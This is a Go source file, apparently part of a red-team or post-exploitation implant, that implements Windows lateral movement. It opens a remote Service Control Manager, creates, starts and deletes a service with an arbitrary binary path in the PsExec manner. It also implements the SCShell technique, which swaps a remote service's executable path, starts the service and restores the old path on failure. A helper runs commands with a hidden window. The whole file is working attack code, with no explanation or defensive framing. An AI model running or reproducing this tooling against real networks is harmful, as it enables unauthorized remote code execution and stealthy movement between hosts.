//go:build (jump_psexec || jump_winrm || jump_wmi || jump_scshell) && windows

package core

import (
	"context"
	"fmt"
	"os/exec"
	"syscall"
	"unsafe"
)

var (
	jumpAdvapi        = syscall.NewLazyDLL("advapi32.dll")
	jumpOpenSCManager = jumpAdvapi.NewProc("OpenSCManagerW")
	jumpCreateService = jumpAdvapi.NewProc("CreateServiceW")
	jumpOpenService   = jumpAdvapi.NewProc("OpenServiceW")
	jumpStartService  = jumpAdvapi.NewProc("StartServiceW")
	jumpDeleteService = jumpAdvapi.NewProc("DeleteService")
	jumpCloseService  = jumpAdvapi.NewProc("CloseServiceHandle")
	jumpQueryConfig   = jumpAdvapi.NewProc("QueryServiceConfigW")
	jumpChangeConfig  = jumpAdvapi.NewProc("ChangeServiceConfigW")
)

const (
	scManagerCreateService = 0x0002
	scManagerConnect       = 0x0001
	serviceQueryConfig     = 0x0001
	serviceChangeConfig    = 0x0002
	serviceStart           = 0x0010
	serviceWin32Own        = 0x00000010
	serviceDemandStart     = 0x00000003
	serviceErrorIgnore     = 0x00000000
	serviceNoChange        = 0xFFFFFFFF
)

func openSCM(target string, access uint32) (syscall.Handle, error) {
	t, _ := syscall.UTF16PtrFromString(`\\` + target)
	h, _, e := jumpOpenSCManager.Call(
		uintptr(unsafe.Pointer(t)), 0, uintptr(access))
	if h == 0 {
		return 0, fmt.Errorf("OpenSCManager(%s): %v", target, e)
	}
	return syscall.Handle(h), nil
}

func svcCreate(target, name, binPath string) (syscall.Handle, error) {
	scm, err := openSCM(target, scManagerCreateService)
	if err != nil {
		return 0, err
	}
	defer jumpCloseService.Call(uintptr(scm))
	n, _ := syscall.UTF16PtrFromString(name)
	d, _ := syscall.UTF16PtrFromString(name)
	b, _ := syscall.UTF16PtrFromString(binPath)
	h, _, e := jumpCreateService.Call(
		uintptr(scm), uintptr(unsafe.Pointer(n)),
		uintptr(unsafe.Pointer(d)), serviceWin32Own,
		serviceDemandStart, serviceErrorIgnore,
		uintptr(unsafe.Pointer(b)), 0, 0, 0, 0, 0)
	if h == 0 {
		return 0, fmt.Errorf("CreateService: %v", e)
	}
	return syscall.Handle(h), nil
}

func svcStartDelete(h syscall.Handle, target, name string) error {
	defer jumpCloseService.Call(uintptr(h))
	r, _, e := jumpStartService.Call(uintptr(h), 0, 0)
	if r == 0 {
		return fmt.Errorf("StartService: %v", e)
	}
	jumpDeleteService.Call(uintptr(h))
	return nil
}

// queryServiceConfig returns the current ImagePath.
func queryServiceConfig(target, name string) (string, syscall.Handle, error) {
	scm, err := openSCM(target, scManagerConnect)
	if err != nil {
		return "", 0, err
	}
	defer jumpCloseService.Call(uintptr(scm))
	n, _ := syscall.UTF16PtrFromString(name)
	h, _, e := jumpOpenService.Call(uintptr(scm),
		uintptr(unsafe.Pointer(n)),
		serviceQueryConfig|serviceChangeConfig|serviceStart)
	if h == 0 {
		return "", 0, fmt.Errorf("OpenService: %v", e)
	}
	buf := make([]byte, 8192)
	var need uint32
	r, _, _ := jumpQueryConfig.Call(uintptr(h), 0,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)),
		uintptr(unsafe.Pointer(&need)))
	if r == 0 {
		jumpCloseService.Call(h)
		return "", 0, fmt.Errorf("QueryServiceConfig failed")
	}
	// SERVICE_CONFIG. lpBinaryPathName follows five DWORDs.
	ptr := *(*uintptr)(unsafe.Pointer(&buf[20]))
	path := ""
	if ptr != 0 {
		path = syscall.UTF16ToString((*[512]uint16)(unsafe.Pointer(ptr))[:])
	}
	return path, syscall.Handle(h), nil
}

func scshellSwap(target, name, newPath string) (string, error) {
	old, h, err := queryServiceConfig(target, name)
	if err != nil {
		return "", err
	}
	defer jumpCloseService.Call(uintptr(h))
	n, _ := syscall.UTF16PtrFromString(newPath)
	r, _, e := jumpChangeConfig.Call(uintptr(h),
		serviceNoChange, serviceNoChange, serviceNoChange,
		0, uintptr(unsafe.Pointer(n)), 0, 0, 0, 0, 0)
	if r == 0 {
		return old, fmt.Errorf("ChangeServiceConfig: %v", e)
	}
	r, _, e = jumpStartService.Call(uintptr(h), 0, 0)
	if r == 0 {
		_, _, _ = jumpChangeConfig.Call(uintptr(h),
			serviceNoChange, serviceNoChange, serviceNoChange,
			0, uintptr(unsafe.Pointer(mustUTF16(old))), 0, 0, 0, 0, 0)
		return old, fmt.Errorf("StartService: %v", e)
	}
	return old, nil
}

func mustUTF16(s string) *uint16 {
	p, _ := syscall.UTF16PtrFromString(s)
	return p
}

func runHidden(ctx context.Context, name string, args ...string) (string, error) {
	cmd := exec.CommandContext(ctx, name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	return string(out), err
}
